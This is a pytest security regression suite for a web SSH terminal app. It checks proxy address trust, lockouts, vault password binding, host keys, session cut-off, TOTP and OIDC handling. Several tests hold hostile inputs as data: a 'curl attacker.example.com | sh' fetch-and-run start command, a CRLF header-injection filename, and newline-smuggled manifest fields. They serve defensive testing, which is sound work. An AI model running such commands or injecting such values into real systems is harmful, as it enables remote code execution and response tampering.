"""What the security review found, each point guarded: forwarded addresses, counted password checks, the
lock across sign-in steps, passwords bound to their target, the owner's command, host keys, sessions that end
with the sign-in, manifests, docs, header injection."""

from __future__ import annotations

import json
from collections.abc import Iterator
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from starlette.requests import Request

from app import crypto, deps
from app.config import get_settings
from app.db import SessionLocal
from app.main import app
from app.models import Account, Connection
from app.routers import oidc as oidc_router
from app.routers.sessions import _disposition
from app.security import MAX_FAILURES, brake
from app.services import accounts, backups, ssh, vault, vault_file
from app.services.oidc import Identity
from tests.conftest import PASSWORD, UI, invite_member, sign_in
from tests.helpers_sshd import PASSWORD as SSH_PASSWORD
from tests.helpers_sshd import Sshd, connect_ws, open_session, receive_json, running_sshd
from tests.test_ssh import make_connection
from tests.test_totp import Clock, code_step, enrol, fresh_code, password_step


@pytest.fixture(name="sshd")
def _sshd(tmp_path: Path) -> Iterator[Sshd]:
    with running_sshd(tmp_path / "sftp-root") as server:
        yield server


@pytest.fixture
def clock(monkeypatch: pytest.MonkeyPatch) -> Clock:
    from app.services import totp

    fake = Clock()
    monkeypatch.setattr(totp, "time", fake)
    return fake


def request_from(peer: str, forwarded: str | None = None) -> Request:
    headers = [(b"x-forwarded-for", forwarded.encode("ascii"))] if forwarded else []
    scope = {
        "type": "http",
        "method": "GET",
        "path": "/",
        "headers": headers,
        "client": (peer, 1234),
        "query_string": b"",
        "scheme": "http",
        "server": ("testserver", 80),
    }
    return Request(scope)


def connection_payload(name: str, host: str, **extra: object) -> dict:
    return {"name": name, "host": host, "port": 22, "user": "admin", "auth": "password", **extra}


# --- Who is the sender ------------------------------------------------------------------------------------------ #


def test_forwarded_addresses_count_only_from_a_trusted_proxy(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = get_settings()
    monkeypatch.setattr(settings, "trusted_proxies", "")
    # Nobody is trusted: the header is ignored, whatever it says.
    assert deps.client_ip(request_from("203.0.113.5", "198.51.100.7, 10.0.0.1")) == "203.0.113.5"
    monkeypatch.setattr(settings, "trusted_proxies", "203.0.113.0/24, 10.0.0.1")
    # The proxy appended the real client on the right; what stands left of it was written by the client.
    assert deps.client_ip(request_from("203.0.113.5", "1.2.3.4, 198.51.100.7")) == "198.51.100.7"
    # A trusted hop inside the chain is skipped.
    assert deps.client_ip(request_from("203.0.113.5", "198.51.100.7, 10.0.0.1")) == "198.51.100.7"
    # Only trusted hops: the leftmost is all there is.
    assert deps.client_ip(request_from("203.0.113.5", "10.0.0.1")) == "10.0.0.1"
    assert deps.client_ip(request_from("203.0.113.5")) == "203.0.113.5"
    # A peer that is not a proxy does not get to name anybody.
    assert deps.client_ip(request_from("198.51.100.9", "10.0.0.1")) == "198.51.100.9"


def test_made_up_forwarded_addresses_do_not_dodge_the_brake(client: TestClient, operator: dict) -> None:
    client.post("/api/auth/logout", headers=UI)
    for number in range(brake.FREE):
        headers = {**UI, "X-Forwarded-For": f"198.51.100.{number}"}
        assert client.post("/api/auth/login", json={"name": "admin", "password": "not-it-at-all"}, headers=headers).status_code == 401
    braked = client.post("/api/auth/login", json={"name": "admin", "password": PASSWORD}, headers={**UI, "X-Forwarded-For": "198.51.100.99"})
    assert braked.status_code == 429 and braked.json()["detail"]["code"] == "too_many_attempts"


# --- Names and passwords ---------------------------------------------------------------------------------------- #


def test_an_unknown_name_costs_a_password_check_too(client: TestClient, operator: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []
    real = accounts.verify_password

    def counting(password: str, password_hash: str) -> bool:
        calls.append(password_hash[:12])
        return real(password, password_hash)

    monkeypatch.setattr(accounts, "verify_password", counting)
    client.post("/api/auth/logout", headers=UI)
    assert client.post("/api/auth/login", json={"name": "nobody-here", "password": "whatever-it-is"}, headers=UI).status_code == 401
    assert len(calls) == 1 and calls[0].startswith("$argon2")


def test_password_login_off_answers_members_and_strangers_alike(client: TestClient, operator: dict) -> None:
    invite_member(client, "alex")
    assert client.put("/api/settings", json={"password_login": False}, headers=UI).status_code == 200
    stranger = TestClient(app, base_url="http://testserver")
    unknown = stranger.post("/api/auth/login", json={"name": "nobody", "password": "whatever-it-is"}, headers=UI)
    member_wrong = stranger.post("/api/auth/login", json={"name": "alex", "password": "whatever-it-is"}, headers=UI)
    assert unknown.status_code == member_wrong.status_code == 401
    assert unknown.json()["detail"]["code"] == member_wrong.json()["detail"]["code"] == "wrong_credentials"
    member_right = stranger.post("/api/auth/login", json={"name": "alex", "password": PASSWORD}, headers=UI)
    assert member_right.status_code == 403 and member_right.json()["detail"]["code"] == "password_login_off"
    assert stranger.post("/api/auth/login", json={"name": "admin", "password": PASSWORD}, headers=UI).status_code == 200


def test_wrong_passwords_while_signed_in_lock_the_account(client: TestClient, operator: dict) -> None:
    for _ in range(MAX_FAILURES):
        brake._fails.clear()
        refused = client.post("/api/vault/unlock", json={"password": "not-it-at-all"}, headers=UI)
        assert refused.status_code == 401, refused.text
    brake._fails.clear()
    locked = client.post("/api/vault/unlock", json={"password": PASSWORD}, headers=UI)
    assert locked.status_code == 429 and locked.json()["detail"]["code"] == "account_locked"
    # The lock is the account's: the sign-in itself waits as well.
    client.post("/api/auth/logout", headers=UI)
    assert client.post("/api/auth/login", json={"name": "admin", "password": PASSWORD}, headers=UI).status_code == 429


def test_the_brake_slows_password_checks_while_signed_in(client: TestClient, operator: dict) -> None:
    for _ in range(brake.FREE):
        assert client.put("/api/auth/password", json={"current": "not-it-at-all", "new": "another-long-password"}, headers=UI).status_code == 401
    braked = client.post("/api/vault/file/export", json={"password": PASSWORD}, headers=UI)
    assert braked.status_code == 429 and braked.json()["detail"]["code"] == "too_many_attempts"


def test_vault_costs_stay_with_the_vault(client: TestClient, operator: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    """A changed NEXTRMNL_ARGON2_* must not lock every vault: the costs travel with the wrapped key."""
    settings = get_settings()
    monkeypatch.setattr(settings, "argon2_time", settings.argon2_time + 1)
    client.post("/api/vault/lock", headers=UI)
    assert client.post("/api/vault/unlock", json={"password": PASSWORD}, headers=UI).status_code == 200


def test_a_password_change_keeps_the_vault_when_the_rewrap_fails(client: TestClient, operator: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    def broken(*_args: object, **_kwargs: object) -> None:
        raise RuntimeError("rewrap broke")

    monkeypatch.setattr(vault, "rewrap", broken)
    with pytest.raises(RuntimeError), SessionLocal() as db:
        accounts.change_password(db, db.get(Account, operator["id"]), PASSWORD, "another-long-password")
    client.post("/api/auth/logout", headers=UI)
    # The old password still signs in and opens the vault: nothing was half changed.
    assert sign_in(client, "admin")["vault"] == "open"


# --- Passwords in the vault --------------------------------------------------------------------------------------- #


def test_a_member_stores_passwords_only_for_visible_connections(client: TestClient, operator: dict) -> None:
    private = client.post("/api/connections", json=connection_payload("private", "192.0.2.10"), headers=UI).json()["id"]
    member = invite_member(client, "alex")
    member_id = member.get("/api/auth/me").json()["id"]
    refused = member.put(f"/api/vault/passwords/{private}", json={"password": "the-member-pw"}, headers=UI)
    assert refused.status_code == 404
    assert client.put(f"/api/connections/{private}/share", json={"account_ids": [member_id]}, headers=UI).status_code == 200
    assert member.put(f"/api/vault/passwords/{private}", json={"password": "the-member-pw"}, headers=UI).status_code == 200
    # The share is withdrawn: the export must not carry the connection's details any more.
    assert client.put(f"/api/connections/{private}/share", json={"account_ids": []}, headers=UI).status_code == 200
    exported = member.post("/api/vault/file/export", json={"password": PASSWORD}, headers=UI)
    assert exported.status_code == 200, exported.text
    _header, payload = vault_file.read(exported.content, PASSWORD)
    assert payload.passwords == []


def test_a_stored_password_stays_with_its_target(client: TestClient, operator: dict) -> None:
    cid = client.post("/api/connections", json=connection_payload("box", "192.0.2.10"), headers=UI).json()["id"]
    assert client.put(f"/api/vault/passwords/{cid}", json={"password": "pw-for-this-box"}, headers=UI).status_code == 200
    with SessionLocal() as db:
        assert vault.get_password(db, operator["id"], cid, host="192.0.2.10", port=22, user="admin") == "pw-for-this-box"
        assert vault.get_password(db, operator["id"], cid, host="192.0.2.99", port=22, user="admin") is None
        assert vault.get_password(db, operator["id"], cid, host="192.0.2.10", port=2222, user="admin") is None
        assert vault.get_password(db, operator["id"], cid, host="192.0.2.10", port=22, user="root") is None
        # Without a target to compare (the vault page, tests) the password is what it always was.
        assert vault.get_password(db, operator["id"], cid) == "pw-for-this-box"


def test_the_owners_start_command_never_runs_for_a_member(client: TestClient, operator: dict) -> None:
    payload = connection_payload("box", "192.0.2.10", start_command="curl attacker.example.com | sh")
    cid = client.post("/api/connections", json=payload, headers=UI).json()["id"]
    member = invite_member(client, "alex")
    member_id = member.get("/api/auth/me").json()["id"]
    client.put(f"/api/connections/{cid}/share", json={"account_ids": [member_id]}, headers=UI)
    with SessionLocal() as db:
        row = db.get(Connection, cid)
        owner = db.get(Account, operator["id"])
        member_row = db.get(Account, member_id)
        assert ssh.target_from_connection(db, owner, row).start_command == "curl attacker.example.com | sh"
        assert ssh.target_from_connection(db, member_row, row).start_command == ""
    own = member.put(f"/api/connections/{cid}/my-access", json={"user": "", "auth": "ask", "key_id": None, "start_command": "tmux new -A -s main"}, headers=UI)
    assert own.status_code == 200, own.text
    with SessionLocal() as db:
        row = db.get(Connection, cid)
        assert ssh.target_from_connection(db, db.get(Account, member_id), row).start_command == "tmux new -A -s main"


# --- Host keys ----------------------------------------------------------------------------------------------------- #


def test_only_the_owner_or_the_operator_forget_a_host_key(client: TestClient, operator: dict) -> None:
    cid = client.post("/api/connections", json=connection_payload("box", "192.0.2.10"), headers=UI).json()["id"]
    member = invite_member(client, "alex")
    member_id = member.get("/api/auth/me").json()["id"]
    client.put(f"/api/connections/{cid}/share", json={"account_ids": [member_id]}, headers=UI)
    refused = member.post(f"/api/connections/{cid}/host-key/forget", headers=UI)
    assert refused.status_code == 403 and refused.json()["detail"]["code"] == "operator_only"
    assert client.post(f"/api/connections/{cid}/host-key/forget", headers=UI).status_code == 204


def test_a_member_cannot_accept_a_changed_host_key(client: TestClient, operator: dict, sshd: Sshd) -> None:
    cid = make_connection(client, sshd, "ask")
    with connect_ws(client, cid) as ws:
        need = open_session(ws)
        assert need["type"] == "need"
        ws.send_json({"type": "password", "value": SSH_PASSWORD})
        assert receive_json(ws)["state"] == "open"
        ws.send_bytes(b"exit\n")
        receive_json(ws)
    member = invite_member(client, "alex")
    member_id = member.get("/api/auth/me").json()["id"]
    client.put(f"/api/connections/{cid}/share", json={"account_ids": [member_id]}, headers=UI)
    sshd.rotate_host_key()
    with connect_ws(member, cid) as ws:
        assert receive_json(ws)["state"] == "connecting"
        # The key is in the store, so the password is asked first; the changed key shows up at the handshake.
        need = receive_json(ws)
        assert need["type"] == "need"
        ws.send_json({"type": "password", "value": SSH_PASSWORD})
        failed = receive_json(ws)
        # No question: the member is told and refused, the store keeps the old key for everybody.
        assert failed["state"] == "failed" and failed["detail"] == "hostkey"
        assert "operator" in failed["message"]
    for row in client.get("/api/connections").json():
        if row["id"] == cid:
            assert row["host_key"]["fingerprint"] != sshd.fingerprint


# --- Sessions end with the sign-in --------------------------------------------------------------------------------- #


def test_logout_everywhere_and_the_operators_sign_out_end_other_sessions(client: TestClient, operator: dict) -> None:
    other = TestClient(app, base_url="http://testserver")
    sign_in(other, "admin")
    assert other.get("/api/auth/me").status_code == 200
    assert client.post("/api/auth/logout-all", headers=UI).status_code == 204
    assert other.get("/api/auth/me").status_code == 401
    assert client.get("/api/auth/me").status_code == 200
    member = invite_member(client, "alex")
    member_id = member.get("/api/auth/me").json()["id"]
    assert member.post(f"/api/accounts/{operator['id']}/sign-out", headers=UI).status_code == 403
    assert client.post(f"/api/accounts/{member_id}/sign-out", headers=UI).status_code == 204
    assert member.get("/api/auth/me").status_code == 401


def test_the_operators_sign_out_cuts_a_live_terminal(client: TestClient, operator: dict, sshd: Sshd) -> None:
    member = invite_member(client, "alex")
    member_id = member.get("/api/auth/me").json()["id"]
    cid = make_connection(member, sshd, "ask")
    with connect_ws(member, cid) as ws:
        need = open_session(ws)
        assert need["type"] == "need"
        ws.send_json({"type": "password", "value": SSH_PASSWORD})
        assert receive_json(ws)["state"] == "open"
        assert client.post(f"/api/accounts/{member_id}/sign-out", headers=UI).status_code == 204
        closed = receive_json(ws)
        assert closed["state"] == "closed" and closed["end"] == "cut" and closed["detail"] == "signed_out"
    records = client.get("/api/sessions/history").json()
    assert records[0]["end"] == "cut" and records[0]["detail"] == "signed_out"


def test_a_reset_second_factor_ends_the_sessions(client: TestClient, operator: dict, clock: Clock) -> None:
    member = invite_member(client, "alex")
    enrol(member)
    member_id = member.get("/api/auth/me").json()["id"]
    assert client.post(f"/api/accounts/{member_id}/totp/reset", headers=UI).status_code == 200
    assert member.get("/api/auth/me").status_code == 401


# --- The second factor under pressure --------------------------------------------------------------------------- #


def test_wrong_codes_lock_the_account_across_password_steps(client: TestClient, operator: dict, clock: Clock) -> None:
    secret, _codes = enrol(client)
    client.post("/api/auth/logout", headers=UI)
    for _round in range(MAX_FAILURES // 5):
        brake._fails.clear()
        password_step(client)
        for _ in range(5):
            code_step(client, "000000")
    brake._fails.clear()
    locked = client.post("/api/auth/login", json={"name": "admin", "password": PASSWORD}, headers=UI)
    assert locked.status_code == 429 and locked.json()["detail"]["code"] == "account_locked"
    assert fresh_code(secret, clock)  # the clock fixture keeps the code helpers consistent


def test_an_empty_seed_verifies_nothing() -> None:
    """Defence in depth below the router: even a caller that hands an empty seed to the algorithm gets an
    exception, never a code computed from nothing."""
    from app.services import totp

    with pytest.raises(totp.SeedUnreadable):
        totp.code_at("", 0)
    with pytest.raises(totp.SeedUnreadable):
        totp.verify_code("", "000000", now=0)


def test_the_second_factor_fails_closed_when_the_seed_is_unreadable(
    client: TestClient, operator: dict, clock: Clock, monkeypatch: pytest.MonkeyPatch
) -> None:
    secret, _codes = enrol(client)
    client.post("/api/auth/logout", headers=UI)
    password_step(client)
    # A foreign secret.key: the seed does not open. Nothing must verify against an empty seed.
    monkeypatch.setattr(crypto, "decrypt_secret", lambda stored: "")
    refused = code_step(client, fresh_code(secret, clock))
    assert refused.status_code == 401 and refused.json()["detail"]["code"] == "second_factor_unavailable"
    assert client.get("/api/auth/me").status_code == 401


# --- OIDC identities ------------------------------------------------------------------------------------------------ #


def test_an_empty_subject_never_matches_an_account(client: TestClient, operator: dict) -> None:
    identity = Identity(issuer="https://sso.example.com", subject="  ", email="admin@example.com", email_verified=True, username="admin")
    with SessionLocal() as db:
        assert oidc_router._resolve(db, identity, True) == "oidc_token_invalid"


def test_unlinking_forgets_the_address_too(client: TestClient, operator: dict) -> None:
    with SessionLocal() as db:
        row = db.get(Account, operator["id"])
        row.oidc_subject, row.email = "person-1", "admin@example.com"
        db.commit()
    assert client.delete("/api/oidc/link", headers=UI).status_code == 204
    me = client.get("/api/auth/me").json()
    assert me["oidc_linked"] is False and me["email"] == ""


def test_a_changed_issuer_drops_every_link(client: TestClient, operator: dict) -> None:
    invite_member(client, "alex")
    with SessionLocal() as db:
        for row in db.query(Account).all():
            row.oidc_subject = f"person-{row.id}"
        db.commit()
        oidc_router.forget_subjects(db, "https://old.example.com", "https://new.example.com")
        assert all(row.oidc_subject == "" for row in db.query(Account).all())


def test_linking_needs_the_password_and_a_configured_provider(client: TestClient, operator: dict) -> None:
    wrong = client.post("/api/oidc/link/start", json={"password": "not-it-at-all"}, headers=UI)
    assert wrong.status_code == 401 and wrong.json()["detail"]["code"] == "wrong_password"
    unset = client.post("/api/oidc/link/start", json={"password": PASSWORD}, headers=UI)
    assert unset.status_code == 409 and unset.json()["detail"]["code"] == "oidc_not_configured"


# --- Small things with sharp edges ------------------------------------------------------------------------------- #


def test_docs_are_off_by_default(client: TestClient) -> None:
    assert client.get("/api/docs").status_code == 404
    assert client.get("/api/openapi.json").status_code == 404


def test_download_names_cannot_split_headers() -> None:
    value = _disposition("evil\r\nSet-Cookie: x=y\x7f.txt")
    assert "\r" not in value and "\n" not in value and "\x7f" not in value
    assert "Set-Cookie" in value  # the text stays, the control characters go


def test_manifests_with_foreign_shapes_are_refused() -> None:
    good = {
        "version": "0.2.0",
        "schema": "sha256:" + "a" * 32,
        "kind": "manual",
        "note": "probe",
        "created": "2026-09-25T20:00:00+00:00",
    }
    backups.Manifest.from_json(json.dumps(good))
    backups.Manifest.from_json(json.dumps({**good, "version": ""}))
    for bad in (
        {**good, "version": "0.2.0\nSigned in name=admin"},
        {**good, "created": "yesterday"},
        {**good, "kind": "evil"},
        {**good, "note": "a\nb"},
        {**good, "schema": "sha256:zz"},
    ):
        with pytest.raises(TypeError):
            backups.Manifest.from_json(json.dumps(bad))
